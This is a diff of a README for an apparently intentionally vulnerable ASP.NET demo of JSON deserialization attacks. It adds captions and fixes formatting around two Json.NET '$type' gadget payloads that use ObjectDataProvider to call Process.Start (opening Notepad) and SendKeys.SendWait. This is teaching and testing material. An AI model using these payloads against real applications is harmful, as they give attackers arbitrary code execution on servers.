@@ -8,14 +8,15 @@ This repository was forked from https://github.com/rishabhupreti/JsonDeserializa
 * Visual Studio 2019 or greater
 * .NET Framework 4.7.2
 
-## How to run this project?
+## How do I run this project?
 Clone this project on your local machine and run the application through IIS Express.
 
 The project is an ASP.NET MVC and Web API web application which has a Home controller (MVC) and Deserialize controller (Web API).
 
 ## Payloads used for attacks
-
-```{
+Open Notepad
+```
+{
     '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName': 'Start',
     'MethodParameters':
@@ -27,9 +28,12 @@ The project is an ASP.NET MVC and Web API web application which has a Home contr
     {
         '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
     }
-}```
+}
+```
 
-```{
+Type lorem ipsum text
+```
+{
     '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'MethodName': 'SendWait',
     'MethodParameters':
@@ -41,4 +45,4 @@ The project is an ASP.NET MVC and Web API web application which has a Home contr
     {
         '$type': 'System.Windows.Forms.SendKeys, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
     }
-}```
+}
